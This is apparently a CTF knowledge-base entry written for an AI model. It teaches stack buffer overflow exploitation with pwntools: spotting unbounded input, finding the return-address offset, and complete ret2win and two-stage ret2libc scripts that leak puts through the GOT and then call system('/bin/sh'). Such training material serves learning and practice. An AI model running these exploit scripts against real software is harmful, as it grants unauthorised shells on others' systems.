---
id: stack-bof-ret2win-ret2libc
category: PWN
tags: [bof, buffer-overflow, ret2win, ret2libc, rop, stack, pwntools, offset, got, plt]
tools: [Ghidra, pwntools]
manuals: ["Manuals/Ghidra/3. Contexto para Claude.md", "Manuals/pwntools/3. Contexto para Claude.md"]
title: "Stack overflow → ret2win / ret2libc with pwntools"
difficulty: medium
created: 2026-10-04
updated: 2026-10-04
related: []
---

## How to recognize this pattern

- An ELF binary that reads input with an unbounded function: `gets`, `scanf("%s")`, `read(0, buf, N)`
  with `N` larger than the buffer.
- `checksec` shows no canary (`No canary found`) — the condition for overwriting the return address
  directly.
- A `ret2win` signal: there's a function never called in the normal flow (a name like `win`,
  `secret`, `giveshell`, `flag`). A `ret2libc` signal: there's no ready-made function, but the binary
  links libc and has `puts`/`printf` in the PLT.

## Method

### 1. Triage
```bash
file ./chall && checksec ./chall          # arch, canary, NX, PIE, RELRO
```
Decompile in Ghidra (via the `ghidra` MCP, see the Manual) to find the vulnerable buffer, hidden
functions, and the buffer size.

### 2. Find the offset to the return address
```python
from pwn import *
p = process("./chall")
p.sendline(cyclic(200))
p.wait()
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8))   # 64-bit; use core.eip in 32-bit
```

### 3a. ret2win (target function exists)
```python
elf = ELF("./chall")
payload = flat({offset: elf.sym["win"]})       # +ret gadget if alignment is needed (see gotcha)
p.sendline(payload)
p.interactive()
```

### 3b. ret2libc (leak + second stage)
```python
elf, rop = ELF("./chall"), ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
# stage 1: leak the address of puts via the GOT, return to main
p.sendline(flat({offset: [pop_rdi, elf.got["puts"], elf.plt["puts"], elf.sym["main"]]}))
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
libc = ELF("./libc.so.6"); libc.address = leak - libc.sym["puts"]
# stage 2: system("/bin/sh")
ret = rop.find_gadget(["ret"])[0]
p.sendline(flat({offset: [ret, pop_rdi, next(libc.search(b"/bin/sh")), libc.sym["system"]]}))
p.interactive()
```
Without the target's libc: identify the version from the leak via https://libc.rip
(`puts`/another known offset).

## Gotchas

- **Stack alignment (x86-64):** `system`/`do_system` uses `movaps`, which requires RSP aligned to 16
  bytes. If the shell "opens and closes", add a lone `ret` gadget before the call to fix the
  alignment (already done in stage 2 above).
- **PIE on:** the binary's addresses are relative — you need a leak of the binary itself before using
  `elf.sym`. `No PIE` simplifies things a lot.
- **32-bit:** arguments go on the stack, not in registers (`pop rdi` doesn't apply); build
  `[func, ret_addr, arg1, arg2]`.
- Test locally with the challenge's libc (`LD_PRELOAD` / `pwninit`), not the system's — the offsets
  differ.

## Cross-reference

Decompilation and binary navigation: `Manuals/Ghidra/3. Contexto para Claude.md`.
